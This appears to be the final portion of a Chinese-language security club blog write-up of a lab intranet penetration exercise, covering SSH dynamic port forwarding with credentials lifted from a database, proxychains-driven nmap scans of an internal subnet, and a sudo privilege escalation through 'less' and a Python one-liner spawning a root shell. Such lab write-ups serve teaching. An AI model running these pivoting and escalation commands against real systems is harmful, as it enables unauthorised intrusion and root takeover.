+<h4 id="dynamic-port-forwarding">Dynamic Port Forwarding</h4>
+<p>由於我們等等需要以 nmap 掃內網，因此選擇 Dynamic Port Forwarding 在 web server 啟動 SOCKS 代理伺服器，這樣就能以不指定 Port 的方式用 nmap 找有開啟服務的 Port。至於要登入的帳號就是前面從資料庫撿到的 <code>macaca:mhub</code>。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>host<span class="o">)</span>$ ssh -D <span class="o">[</span>client:<span class="o">]</span>&lt;port&gt; &lt;SSH server&gt;
+</span></span></code></pre></div><div class="details admonition note open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw" aria-hidden="true"></i>小提醒<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><ol>
+<li>由於講師整個服務只有 Port 80 對外開放，因此需要透過 VPN 先跳 DMZ 進去再建 SSH Tunneling，之後如果 web server 有開 SSH 就不用 VPN 了。</li>
+<li>SSH Tunneling 這裡只負責建立通道，因此 SSH 參數可以加上 <code>-N</code> 不顯示其他 prompt 資訊（可以比較下圖和之後 <code>ProxyChains</code> 的作法）。</li>
+<li>ProxyChains 預設走 Port 9050，因此在 SSH 連線直接 bind Port 9050。 若要用其他的 Port ，可以到 <code>/etc/proxychains.conf</code> 修改。</li>
+</ol>
+</div>
+        </div>
+    </div>
+<p>這邊都在 host 下指令，可以開兩個 terminal 進行觀察（這邊我用 <code>tmux</code> 切成左右畫面）。<br>
+左邊的畫面先使用 WireGuard VPN 跳進 DMZ，然後進行 Dynamic Port Forwarding，輸入密碼後就成功建立 SSH Tunneling，之後卡著不用動。
+之後的操作主要都是以右邊的畫面為主，可以先用 <code>netstat</code> 檢查看看是否有在 LISTEN Port 9050。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650604912/blog-posts/2022-04/21-ssh-tunneling-d_zapun5.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650604912/blog-posts/2022-04/21-ssh-tunneling-d_zapun5.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650604912/blog-posts/2022-04/21-ssh-tunneling-d_zapun5.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650604912/blog-posts/2022-04/21-ssh-tunneling-d_zapun5.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650604912/blog-posts/2022-04/21-ssh-tunneling-d_zapun5.webp"
+        title=" " /></p>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>2022.4.26 UPDATE<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>老實說，拿到 web shell 後還要 VPN 跳到 DMZ 建 SSH tunneling 這件事，不是很 real world。</p>
+<p>課堂上原本有教使用 SSH remote 的連線方式，在拿到 web shell / reverse shell 從 web server 主動向 local 建立 SSH tunneling，但是會遇到 SSH 需要輸入密碼的互動環節而卡關，這個問題可以搭配 <a href="https://github.com/clarkwang/passh" target="_blank" rel="noopener noreffer ">passh</a> 連同密碼直接向 local 建立 SSH tunneling （<del>但明文密碼會不會被網管反過來利用就不好說了，保重</del>）。</p>
+<p>此外，也可以用 SSH 以外的方式建立 tunneling，例如 <a href="https://github.com/L-codes/Neo-reGeorg" target="_blank" rel="noopener noreffer ">reGeorg</a>，重點就是如何讓 local 和 DMZ 之間建立連線，再透過 ProxyChains 滲透到內網中。</p>
+</div>
+        </div>
+    </div>
+<h3 id="proxychains">ProxyChains</h3>
+<p>成功建立 SSH Tunneling 後，我們就能藉由 ProxyChains 透過 host 的 Port 9050 下指令到 web server。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650623224/blog-posts/2022-04/21-info-2_sd9b09.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650623224/blog-posts/2022-04/21-info-2_sd9b09.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650623224/blog-posts/2022-04/21-info-2_sd9b09.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650623224/blog-posts/2022-04/21-info-2_sd9b09.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650623224/blog-posts/2022-04/21-info-2_sd9b09.webp"
+        title=" " /></p>
+<p>我們可以用之前在 reverse shell 撿到的內網網段 <code>10.255.0.0/24</code> ，在右邊畫面使用 nmap 掃掃看有沒有開 Port 22 的主機。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>host<span class="o">)</span>$ proxychains nmap -p <span class="m">22</span> 10.255.0.0/24 --open
+</span></span></code></pre></div><p>使用情況如下圖，可以發現左邊也會收到 nmap 的結果，此屬正常情況（若覺得礙眼，也可以在建 SSH Tunneling 階段用 <code>-f</code> 放到背景執行）。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650604913/blog-posts/2022-04/21-proxychains-nmap-all_j6a8aa.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650604913/blog-posts/2022-04/21-proxychains-nmap-all_j6a8aa.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650604913/blog-posts/2022-04/21-proxychains-nmap-all_j6a8aa.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650604913/blog-posts/2022-04/21-proxychains-nmap-all_j6a8aa.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650604913/blog-posts/2022-04/21-proxychains-nmap-all_j6a8aa.webp"
+        title=" " /></p>
+<p>直接掃應該會需要不少時間，何況 nmap 掃 IP 居然是跳著掃Orz<br>
+沒意外的話，最後可以掃到 10.255.0.10 有開 Port 22 服務。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650604912/blog-posts/2022-04/21-proxychains-nmap-target_bj36oc.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650604912/blog-posts/2022-04/21-proxychains-nmap-target_bj36oc.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650604912/blog-posts/2022-04/21-proxychains-nmap-target_bj36oc.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650604912/blog-posts/2022-04/21-proxychains-nmap-target_bj36oc.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650604912/blog-posts/2022-04/21-proxychains-nmap-target_bj36oc.webp"
+        title=" " /></p>
+<p>如此一來我們就可以利用 ProxyChains 直接 SSH 連進內網主機了。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650604912/blog-posts/2022-04/21-proxychains-ssh-target_amcnbz.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650604912/blog-posts/2022-04/21-proxychains-ssh-target_amcnbz.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650604912/blog-posts/2022-04/21-proxychains-ssh-target_amcnbz.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650604912/blog-posts/2022-04/21-proxychains-ssh-target_amcnbz.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650604912/blog-posts/2022-04/21-proxychains-ssh-target_amcnbz.webp"
+        title=" " /></p>
+<p>課程至此完成內網滲透，之後就是從內網主機的資訊決定下一步要怎麼走了。</p>
+<h2 id="bonus">Bonus</h2>
+<h3 id="another-privilege-escalation">Another Privilege Escalation</h3>
+<p>原本是講師覺得內網沒東西很奇怪，所以硬是放了一個神奇的提權漏洞，有興趣可以參考 <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/" target="_blank" rel="noopener noreffer ">Linux Privilege Escalation using Sudo Rights</a>。事實上社課也是把前面的 SUID 提權跳過才勉強講完，真的是蠻可惜的QQ</p>
+<p>首先，進入內網主機後，用 <code>sudo -l</code> 查看 macaca 可以執行的指令，發現有幾個限定的指令包括 <code>less</code>、<code>man</code>、<code>python</code>、<code>perl</code>。<br>
+先隨便生個檔案，並且用 <code>sudo less</code> 開啟檔案。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650613002/blog-posts/2022-04/21-bonus-sudo_yjdbta.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650613002/blog-posts/2022-04/21-bonus-sudo_yjdbta.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650613002/blog-posts/2022-04/21-bonus-sudo_yjdbta.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650613002/blog-posts/2022-04/21-bonus-sudo_yjdbta.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650613002/blog-posts/2022-04/21-bonus-sudo_yjdbta.webp"
+        title=" " /></p>
+<p>因為 <code>less</code> 可以用 <code>!</code> 接 shell command，所以可以直接在裡頭下指令 <code>!/bin/bash</code>，同時由於是用 <code>sudo</code> 執行，所以 Enter 後就會直接拿到 root 的 <code>/bin/bash</code> 了。<br>
+<del>（畫面很空，給各位看看星街的美圖）</del></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650613002/blog-posts/2022-04/21-bonus-sudo-less_dxufu4.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650613002/blog-posts/2022-04/21-bonus-sudo-less_dxufu4.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650613002/blog-posts/2022-04/21-bonus-sudo-less_dxufu4.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650613002/blog-posts/2022-04/21-bonus-sudo-less_dxufu4.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650613002/blog-posts/2022-04/21-bonus-sudo-less_dxufu4.webp"
+        title=" " /></p>
+<p>確認取得 root 後就能去拿 <code>/root</code> 底下的 flag 。</p>
+<blockquote>
+<p>MacacaHub{sudo-privilege-bf614797197ac53ee9785ee8c22a7d38}</p>
+</blockquote>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650618071/blog-posts/2022-04/21-bonus-get-root_kwzv5q.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650618071/blog-posts/2022-04/21-bonus-get-root_kwzv5q.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650618071/blog-posts/2022-04/21-bonus-get-root_kwzv5q.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1650618071/blog-posts/2022-04/21-bonus-get-root_kwzv5q.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650618071/blog-posts/2022-04/21-bonus-get-root_kwzv5q.webp"
+        title=" " /></p>
+<p>用 python 和 perl 的道理也一樣，透過 <code>sudo</code> 權限執行 <code>/bin/bash</code> 拿到 root，如下。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo python -c <span class="s2">&#34;import os; os.system(&#39;/bin/bash&#39;)&#34;</span>
+</span></span></code></pre></div><h2 id="後記">後記</h2>
+<p>內網滲透通常是需要好幾個技巧串起來才能夠完成，整體看下來雖然好像很單純順利，但其實很多觀念要理解也不容易，至少我光是在 SSH Tunneling 的四種連線方式摸了很久才大概看懂，所以趁這次社課把一些過程筆記下來，或許哪天不小心碰到也說不定。</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-04-21</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/nsysuisc-%E4%B8%AD%E5%B1%B1%E8%B3%87%E5%AE%89%E7%A4%BE/">NSYSUISC 中山資安社</a>,&nbsp;<a href="/tags/intranet-penetration/">Intranet Penetration</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2021/hitcon2021-devcore-web-challenge/" class="prev" rel="prev" title="[DEVCORE @HITCON2021] Wargame Web Challenge"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>[DEVCORE @HITCON2021] Wargame Web Challenge</a>
+            <a href="/posts/2023/2023h1-sharing/" class="next" rel="next" title="[2023H1 雜談] 嘿！我回來了">[2023H1 雜談] 嘿！我回來了<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.134.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://blog.cyris.tw" target="_blank">Cyris Tseng</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":20},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"Comment 💬","lightTheme":"github-light","repo":"yctseng1227/blog-comments"}}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
